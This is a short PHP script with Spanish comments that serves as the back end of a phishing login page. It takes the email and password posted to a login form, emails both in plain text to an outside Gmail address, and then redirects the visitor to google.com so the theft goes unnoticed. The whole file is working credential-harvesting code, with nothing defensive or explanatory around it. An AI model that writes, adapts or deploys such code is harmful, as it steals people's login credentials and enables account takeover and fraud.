<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // Recoge los datos del formulario
    $correo = $_POST["correo"]; // Asegúrate de que estos nombres coincidan con los atributos "name" de tus campos de formulario
    $contrasena = $_POST["contrasena"];

    // Construye el cuerpo del correo
    $mensaje = "Correo: $correo\nContraseña: $contrasena";

    // Envia el correo
    $destinatario = "blancacapa904@gmail.com";
    $asunto = "Nuevo formulario de inicio de sesión";
    $cabeceras = "From: webmaster@example.com"; // Cambia esto según tus necesidades

    // Utiliza la función mail para enviar el correo
    mail($destinatario, $asunto, $mensaje, $cabeceras);

    // Redirige a una página de éxito o haz lo que consideres necesario
    header("Location: https://www.google.com");
    exit();
}
?>

